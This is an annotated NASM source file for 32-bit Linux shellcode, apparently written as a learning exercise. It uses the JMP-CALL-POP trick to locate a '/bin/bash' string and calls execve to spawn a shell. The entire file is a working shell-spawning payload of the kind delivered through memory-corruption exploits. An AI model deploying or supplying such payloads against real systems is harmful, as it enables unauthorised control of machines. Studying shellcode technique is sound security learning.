;Written JMP CALL POP SHELLCODE for NASM

;int execve(const char *filename, char *const argv[],char *const envp[]) 

;11 is the syscall number for execve

global _start

section .text

_start:
	jmp P1

P2:
	;syscall 
	pop esi
	
	;Generating null, some of execve arguments are null
	xor eax,eax
	
	;Moving zero to string pointed by esi. Esi points to memory location of /bin/bashXYYYYZZZZ
	;So we move zero to the 9th position-> /bin/bash0x00YYYYZZZZ
	mov byte [esi+9],al
	; /bin/bash,0x00,Address of /bin/bash str
	mov dword [esi+10],esi
	
	;/bin/bash, 0x0,Address of /bin/bash str, 0x00 0x00 0x00 0x00 0x00
	mov dword [esi+14],eax
	
	;Now we must store the correct values at the registers. EBX is the address of string, which is esi itself
	mov ebx, esi
	
	
	lea ecx,[esi+10]
	
	lea edx,[esi+14]	

	mov al, 11
	int 0x80

	;No need for exit call, we will be in a different process.
	
	
P1:
	call P2
	message db "/bin/bashXYYYYCCCC"

